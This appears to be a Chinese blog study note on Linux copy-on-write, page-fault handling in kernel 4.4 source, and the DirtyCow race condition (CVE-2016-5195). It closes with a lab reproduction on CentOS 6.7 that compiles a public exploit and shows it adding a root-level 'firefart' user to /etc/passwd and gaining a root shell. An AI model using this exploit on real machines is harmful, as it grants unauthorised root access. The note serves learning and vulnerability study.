---
title: DirtyCow
tags: [ctf-pwn]
date: 2024-07-23 18:49:00
categories: [学习笔记]
excerpt: copy on write 和 dirty cow CVE-2016-5195 复现
---

### Copy on Write 和 Page Fault

访问一个线性地址，它不对应某个物理地址，会发生page fault中断

> 扫盲：
>
> 逻辑地址：[段选择符 :  Offset]，即[CS:IP]，CS就是代码段、数据段之类的
>
> 虚拟地址：可以直接看作逻辑地址的段内偏移，即IP，程序里写的（int*)p，就是虚拟地址
>
> 线性地址：拿着段标识符，去GDT（全局描述符表）查，查到一个segment base address，加上offset，就是线性地址。这就是内存的段式管理。
>
> 物理地址：线性地址拆成三部分，第一部分去Page Directory里查，查到的结果加上第二部分，去Page Table里查，查到的结果加上第三部分，就是物理地址
>
> ![](/img/学习笔记/DirtyCow/1.jpg)

1. soft page fault ：相关的页已经被载入到物理内存中，但是没有向MMU（Memory Management Unit）注册。比如一次malloc之后，首次访问会发生page fault；比如多个进程访问同一个共享内存数据  *copy on write时就会发生这种情况，父子进程都对共享内存只有读权限（Read Only），写哪个内存页，就要分配一个新的页*
2. hard page fault：相关的页需要从某些慢设备载入
3. invalid page fault：越界访问，segment fault

page fault的处理过程从 https://elixir.bootlin.com/linux/v4.4.302/source/arch/x86/mm/fault.c#L1080，__do_page_fault() 函数开始

#### __do_page_fault()

```c
static noinline void
__do_page_fault(struct pt_regs *regs, unsigned long error_code,unsigned long address)
```

传入的address就是一个线性地址

```c
tsk = current;
mm = tsk->mm;
```

当前进程描述符和内存描述符

```c
/*
	 * We fault-in kernel-space virtual memory on-demand. The
	 * 'reference' page table is init_mm.pgd.
	 *
	 * NOTE! We MUST NOT take any locks for this case. We may
	 * be in an interrupt or a critical region, and should
	 * only copy the information from the master page table,
	 * nothing more.
	 *
	 * This verifies that the fault happens in kernel space
	 * (error_code & 4) == 0, and that the fault was not a
	 * protection error (error_code & 9) == 0.
	 */	
if (unlikely(fault_in_kernel_space(address))) {
    if (!(error_code & (PF_RSVD | PF_USER | PF_PROT))) {//三个标志位都无说明是内核触发的内核空间的缺页异常
        if (vmalloc_fault(address) >= 0)
            return;
```

这部分判断page fault是否发生在kernel部分的内存，vmalloc处理内核态的异常

```c
    /* Can handle a stale RO->RW TLB: */
    if (spurious_fault(error_code, address))
    return;
```

kernel 的page fault也可能是TLB flush导致的虚假的page fault

```c
    /*
     * Don't take the mm semaphore here. If we fixup a prefetch
     * fault we could otherwise deadlock:
     */
    bad_area_nosemaphore(regs, error_code, address);
```

非法地址访问产生的异常，比如用户态访问kernel的地址

```c
if (unlikely(error_code & PF_RSVD))
    pgtable_bad(regs, error_code, address);
```

从这里开始是用户态，首先是页表错误

```c
if (unlikely(smap_violation(error_code, regs))) {
    bad_area_nosemaphore(regs, error_code, address);
    return;
}
```

这是在处理内核访问用户态地址的异常

```c
	/*
	 * It's safe to allow irq's after cr2 has been saved and the
	 * vmalloc fault has been handled.
	 *
	 * User-mode registers count as a user access even for any
	 * potential system fault or CPU buglet:
	 */
	if (user_mode(regs)) {
		local_irq_enable();
		error_code |= PF_USER;
		flags |= FAULT_FLAG_USER;
	} else {
		if (regs->flags & X86_EFLAGS_IF)
			local_irq_enable();
	}
```

设置是由用户态引起的page fault的标志位

```c
	if (error_code & PF_WRITE)
		flags |= FAULT_FLAG_WRITE;
```

缺页异常是由写操作引起的

```c
	if (unlikely(!down_read_trylock(&mm->mmap_sem))) {
		if ((error_code & PF_USER) == 0 &&
		    !search_exception_tables(regs->ip)) {
			bad_area_nosemaphore(regs, error_code, address);
			return;
		}
retry:
		down_read(&mm->mmap_sem);
	} else {
		/*
		 * The above down_read_trylock() might have succeeded in
		 * which case we'll have missed the might_sleep() from
		 * down_read():
		 */
		might_sleep();
	}
```

这部分代码在给尽成的内存描述符上锁

```c
	vma = find_vma(mm, address);
	if (unlikely(!vma)) {
		bad_area(regs, error_code, address);
		return;
	}
	if (likely(vma->vm_start <= address))
		goto good_area;
```

寻找线性地址位于哪个vma中

```c
	fault = handle_mm_fault(mm, vma, address, flags);
	major |= fault & VM_FAULT_MAJOR;
```

调用`handle_mm_fault`处理异常

#### __handle_mm_fault

https://elixir.bootlin.com/linux/v4.4.302/source/mm/memory.c#L3485 的 `handle_mm_fault` 调用

https://elixir.bootlin.com/linux/v4.4.302/source/mm/memory.c#L3392 `__handle_mm_fault`

```c
static int __handle_mm_fault(struct mm_struct *mm, struct vm_area_struct *vma,
			     unsigned long address, unsigned int flags)
{
	pgd_t *pgd;
	pud_t *pud;
	pmd_t *pmd;
	pte_t *pte;
    ...
	pte = pte_offset_map(pmd, address);
    return handle_pte_fault(mm, vma, address, pte, pmd, flags);
}
```

linux的四级页表结构，省略部分是获取这四个值的过程，获取到PTE（也就是最终的页表项）交给`handle_pte_fault`

#### handle_pte_fault

https://elixir.bootlin.com/linux/v4.4.302/source/mm/memory.c#L3325

```c
if (!pte_present(entry)) { 
    if (pte_none(entry)) {
        if (vma_is_anonymous(vma))
            return do_anonymous_page(mm, vma, address, pte, pmd, flags);
        else
            return do_fault(mm, vma, address, pte, pmd, flags, entry);
    }
    return do_swap_page(mm, vma, address, pte, pmd, flags, entry);
```

分析页表项对应的物理页是否存在于主存中，pte项为空，表示第一次访问该页，并未与物理页关联
如果是匿名页（anonymous page，如堆，栈，数据段等，不是以文件形式存在，因此无法和磁盘文件交换），执行`do_anonymous_page()`，分配一个新的页；如果不是匿名页调用`do_fault()`。
如果pte项不为空，从外存交换进来

```c
if (flags & FAULT_FLAG_WRITE) {
		if (!pte_write(entry))
			return do_wp_page(mm, vma, address, pte, pmd, ptl, entry);
		entry = pte_mkdirty(entry);
	}
```

分析是否是写操作引起的page fault，对应页不可写，调用`do_wp_page`执行copy on write；对应页可写，标为脏页

> 修改的文件数据并不会马上同步到磁盘，会缓存在内存的page cache中，我们把这种和磁盘数据不一致的页称为脏页 

```c
	entry = pte_mkyoung(entry);
	if (ptep_set_access_flags(vma, address, pte, entry, flags & FAULT_FLAG_WRITE)) {
		update_mmu_cache(vma, address, pte);
	} else {...
```

pte修改之后，将新的内容写入页表项



页不在主存的时候，在`do_fault()`中调用`do_cow_fault()`进行写时复制；当在主存中时，调用`do_wp_page()`进行写时复制

**当一个进程首次访问一个内存页时应当会触发两次缺页异常，首先会执行`do_fault()`这条路径，然后第二次走`do_wp_page()`这条路径**



#### do_fault() & do_cow_fault()

https://elixir.bootlin.com/linux/v4.4.302/source/mm/memory.c#L3030

```c
ret = __do_fault(vma, address, pgoff, flags, new_page, &fault_page);
if (unlikely(ret & (VM_FAULT_ERROR | VM_FAULT_NOPAGE | VM_FAULT_RETRY)))
    goto uncharge_out;

if (fault_page)
    copy_user_highpage(new_page, fault_page, address, vma);
...
do_set_pte(vma, address, new_page, pte, true, true);
...
```

在copy on write时，首先将需要写入的页会复制出来，然后设置pte

#### do_wp_page()

https://elixir.bootlin.com/linux/v4.4.302/source/mm/memory.c#L2372

总体上就是先尝试用第一次page fault `do_cow_fault`分配出来的页，各种情况都不行再重新copy

```c
if (reuse_swap_page(old_page)) {
    /*
	 * The page is all ours.  Move it to our anon_vma so
	 * the rmap code will not search our parent or siblings.
	 * Protected against the rmap code by the page lock.
	 */
    page_move_anon_rmap(old_page, vma, address);
    unlock_page(old_page);
    return wp_page_reuse(mm, vma, address, page_table, ptl, orig_pte, old_page, 0, 0);
}
```

检查这个要写的页是否只有当前一个进程在使用，如果有就直接在上面写

```c
page_cache_get(old_page);
pte_unmap_unlock(page_table, ptl);
return wp_page_copy(mm, vma, address, page_table, pmd, orig_pte, old_page);
```

在所有不复制的条件都不满足的情况下，才对要写的页进行复



### DirtyCow 原理

原本使用mmap将一个只读文件映射到内存中，然后开辟一个新的进程，越权向`/proc/self/mem`写入内容

> /proc/self/mem是进程的内存内容，通过修改该文件相当于直接修改当前进程的内存

写入的过程是调用`mem_write`写入的

```c
static ssize_t mem_write(struct file *file, const char __user *buf,
			 size_t count, loff_t *ppos)
{
	return mem_rw(file, (char __user*)buf, count, ppos, 1);
}
```

调用了`mem_rw` https://elixir.bootlin.com/linux/v4.4.302/source/fs/proc/base.c#L864

```c
page = (char *)__get_free_page(GFP_TEMPORARY);
```

分配了一个临时的空闲内存页

```c
		if (write && copy_from_user(page, buf, this_len)) {
			copied = -EFAULT;
			break;
		}

		this_len = access_remote_vm(mm, addr, page, this_len, flags);
```

如果是写操作，将要写入的字节复制到这个内存页上来，然后调用`access_remote_vm`

https://elixir.bootlin.com/linux/v4.4.302/source/mm/memory.c#L3715

漏洞点主要关注调用的`get_user_pages`函数，获取需要写入的目标内存页

```c
...
retry:
		/*
		 * If we have a pending SIGKILL, don't keep faulting pages and
		 * potentially allocating memory.
		 */
		if (unlikely(fatal_signal_pending(current)))
			return i ? i : -ERESTARTSYS;
		cond_resched();
		page = follow_page_mask(vma, start, foll_flags, &page_mask);
		if (!page) {
			int ret;
			ret = faultin_page(tsk, vma, start, &foll_flags,
					nonblocking);
			switch (ret) {
			case 0:
				goto retry;
...
```

第一次访问某个分配出来的页时，会运维延迟绑定机制，没有建立和物理页的映射，`follow_page_mask`返回NULL，`faultin_page`会建立物理页的映射，然后retry

第二次如果发现物理页没有写的权限，会通过`faultin_page`进行copy on write

`follow_page_mask()`判断内存页会被写入是根据`foll_flags`的`FOLL_WRITE`标志位判断的，但是决定向该内存页写入数据是由 `mem_rw()` 函数的参数 `write` 决定的，触发竞争





### 测试

安装一个centos6.7 https://archive.kernel.org/centos-vault/6.7/isos/x86_64/

> centos 旧版不论是阿里的还是网易的镜像都不再支持了，只能在这个旧版本centos的网站上下 https://vault.centos.org/
>
> minimal版本的镜像安装时要先创建虚拟机，再添加镜像文件，否则默认是带桌面ui的，vmware安装时会报错卡死

查看内核

```bash
[root@localhost ~]# uname -r
2.6.32-573.el6.x86_64
```

比影响范围中的版本要早：

```
Centos7/RHEL7     3.10.0-327.36.3.el7
Cetnos6/RHEL6     2.6.32-642.6.2.el6
Ubuntu 16.10      4.8.0-26.28
Ubuntu 16.04      4.4.0-45.66
Ubuntu 14.04      3.13.0-100.147
Debian 8          3.16.36-1+deb8u2
Debian 7          3.2.82-1
```

~~为了装这个旧版的centos6.7踩了一堆坑😭~~

用一个别人写好的exp （https://github.com/FireFart/dirtycow）：

```bash
[test@localhost ~]$ gcc -pthread pwn.c -o dirty -lcrypt
[test@localhost ~]$ ls
dirty  pwn.c
[test@localhost ~]$ ./dirty
/etc/passwd successfully backed up to /tmp/passwd.bak
Please enter the new password:
Complete line:
firefart:fik57D3GJz/tk:0:0:pwned:/root:/bin/bash

mmap: 7fb864ede000
madvise 0

ptrace 0
Done! Check /etc/passwd to see if the new user was created.
You can log in with the username 'firefart' and the password 'firefart'.


DON'T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd
[test@localhost ~]$ su firefart
Password:
[firefart@localhost test]#
```

